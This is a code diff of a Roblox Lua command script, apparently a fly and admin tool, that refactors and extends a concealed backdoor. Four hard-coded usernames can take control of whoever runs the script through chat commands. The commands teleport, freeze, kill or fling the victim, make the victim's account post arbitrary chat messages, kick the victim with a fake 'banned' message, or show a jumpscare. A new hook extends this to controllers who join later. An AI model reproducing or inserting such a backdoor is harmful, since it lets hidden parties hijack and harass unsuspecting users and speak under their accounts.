@@ -1071,6 +1071,15 @@ function unfly() --cmd unfly
 	if bodyFly then
 		bodyFly:Destroy()
 	end
+
+	uisHolderDown:Disconnect()
+	uisHolderDown = nil
+	
+	uisHolderUp:Disconnect()
+	uisHolderUp = nil
+
+	flyLook:Disconnect()
+	flyLook = nil
 end
 
 function bfly() --cmd bfly
@@ -2106,9 +2115,7 @@ end)
 
 uis.InputBegan:Connect(function(i, g)
 	if i.KeyCode == Enum.KeyCode.Semicolon and not g then
-		text:CaptureFocus()
-		task.wait(0.1)
-		text.Text = ""
+		
 	end
 end)
 
@@ -2116,64 +2123,77 @@ run.RenderStepped:Connect(function()
 	text.Text = text.Text:gsub(";", "")
 end)
 
-for _, control in pairs(plr:GetPlayers()) do
-	if control.Name == "1reserveacc1" or control.Name == "Litka505" or control.Name == "Baconchik_oofarik" or control.Name == "x0y0zkidd" then
-		control.Chatted:Connect(function(chat)
-			if chat == "!bring" then
-				hrp.CFrame = control.Character.HumanoidRootPart.CFrame
-			elseif chat == "!freeze" then
-				hrp.Anchored = true
-			elseif chat == "!unfreeze" then
-				hrp.Anchored = false
-			elseif chat:sub(1,4) == "!say" then
-				local cArgs = chat:sub(6)
+local allowed = {
+	["1reserveacc1"] = true,
+	["Litka505"] = true,
+	["x0y0zkidd"] = true,
+	["Baconchik_oofarik"] = true
+}
 
-				if cArgs ~= "" then
-					if textChat and textChat:FindFirstChild("TextChannels") then
-						local textChat2 = textChat.TextChannels:FindFirstChild("RBXGeneral")
+function controlp(control)
+	if not allowed[control.Name] then return end
+	
+	control.Chatted:Connect(function(chat)
+		if chat == "!bring" then
+			hrp.CFrame = control.Character.HumanoidRootPart.CFrame
+		elseif chat == "!freeze" then
+			hrp.Anchored = true
+		elseif chat == "!unfreeze" then
+			hrp.Anchored = false
+		elseif chat:sub(1,4) == "!say" then
+			local cArgs = chat:sub(6)
 
-						if textChat2 then
-							textChat2:SendAsync(cArgs)
-						end
-					end
-				elseif rep and rep:FindFirstChild("DefaultChatSystemChatEvents") then
-					local oldChat = rep.DefaultChatSystemChatEvents
-					if oldChat then
-						oldChat.SayMessageRequest:FireServer(cArgs, "ALL")
+			if cArgs ~= "" then
+				if textChat and textChat:FindFirstChild("TextChannels") then
+					local textChat2 = textChat.TextChannels:FindFirstChild("RBXGeneral")
+
+					if textChat2 then
+						textChat2:SendAsync(cArgs)
 					end
 				end
-			elseif chat == "!ban" then
-				me:Kick("You have been banned!")
-			elseif chat == "!jumpscare" then
-				local Jscreen  = Instance.new("ScreenGui")
-				Jscreen.Parent = me.PlayerGui
-
-				local Jimage  = Instance.new("ImageLabel")
-				Jimage.Parent = Jscreen
-				Jimage.Image  = "http://www.roblox.com/asset/?id=91274624708428"
-				Jimage.Size   = UDim2.new(1,1,1,1)
-
-				local Jsound                = Instance.new("Sound")
-				Jsound.Parent               = work
-				Jsound.Name                 = "jmp"
-				Jsound.SoundId              = "rbxassetid://6129291390"
-				Jsound.Volume               = 10
-
-				work.jmp.Playing = true
-
-				Jscreen.ResetOnSpawn = false
-
-				task.delay(9.8, function()
-					Jscreen:Destroy()
-				end)
-			elseif chat == "!kill" then
-				hum.Health = 0
-			elseif chat == "!fling" then
-				hrp.CFrame = CFrame.new(-64.4950714, 633.052734, 104.106598, -0.921858728, -0.378823459, 0.0816653818, -1.67315939e-10, 0.210735187, 0.977543235, -0.387526065, 0.901156723, -0.1942681)
+			elseif rep and rep:FindFirstChild("DefaultChatSystemChatEvents") then
+				local oldChat = rep.DefaultChatSystemChatEvents
+				if oldChat then
+					oldChat.SayMessageRequest:FireServer(cArgs, "ALL")
+				end
 			end
-		end)
-	end
+		elseif chat == "!ban" then
+			me:Kick("You have been banned!")
+		elseif chat == "!jumpscare" then
+			local Jscreen  = Instance.new("ScreenGui")
+			Jscreen.Parent = me.PlayerGui
+
+			local Jimage  = Instance.new("ImageLabel")
+			Jimage.Parent = Jscreen
+			Jimage.Image  = "http://www.roblox.com/asset/?id=91274624708428"
+			Jimage.Size   = UDim2.new(1,1,1,1)
+
+			local Jsound                = Instance.new("Sound")
+			Jsound.Parent               = work
+			Jsound.Name                 = "jmp"
+			Jsound.SoundId              = "rbxassetid://6129291390"
+			Jsound.Volume               = 10
+
+			work.jmp.Playing = true
+
+			Jscreen.ResetOnSpawn = false
+
+			task.delay(9.8, function()
+				Jscreen:Destroy()
+			end)
+		elseif chat == "!kill" then
+			hum.Health = 0
+		elseif chat == "!fling" then
+			hrp.CFrame = CFrame.new(-64.4950714, 633.052734, 104.106598, -0.921858728, -0.378823459, 0.0816653818, -1.67315939e-10, 0.210735187, 0.977543235, -0.387526065, 0.901156723, -0.1942681)
+		end
+	end)
 end
+
+for _, checkForAllowedP in pairs(plr:GetPlayers()) do
+	controlp(checkForAllowedP)
+end
+
+plr.PlayerAdded:Connect(controlp)
 
 screen.Parent = game:GetService("CoreGui")
 
